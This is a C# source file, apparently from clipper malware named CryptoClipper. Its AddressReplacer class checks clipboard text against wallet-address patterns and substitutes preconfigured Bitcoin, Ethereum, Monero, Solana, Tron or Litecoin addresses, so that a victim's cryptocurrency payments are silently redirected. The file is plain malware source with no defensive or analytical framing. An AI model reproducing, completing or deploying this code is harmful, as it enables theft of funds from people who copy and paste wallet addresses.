using CryptoClipper.Config;
using CryptoClipper.Models;

namespace CryptoClipper.Core;

public sealed class AddressReplacer
{
    private readonly WalletMatcher _matcher;
    private readonly WalletAddresses _addresses;

    public AddressReplacer(WalletMatcher matcher, WalletAddresses addresses)
    {
        _matcher = matcher;
        _addresses = addresses;
    }

    public string? TryReplace(string clipboardContent)
    {
        string trimmed = clipboardContent.Trim();

        WalletReplacementRule? rule = _matcher.Match(trimmed);

        if (rule is null)
            return null;

        string replacement = rule.CoinType switch
        {
            CoinType.Bitcoin => _addresses.Bitcoin,
            CoinType.Ethereum => _addresses.Ethereum,
            CoinType.Monero => _addresses.Monero,
            CoinType.Solana => _addresses.Solana,
            CoinType.Tron => _addresses.Tron,
            CoinType.Litecoin => _addresses.Litecoin,
            _ => trimmed
        };

        return string.IsNullOrEmpty(replacement) ? null : replacement;
    }
}
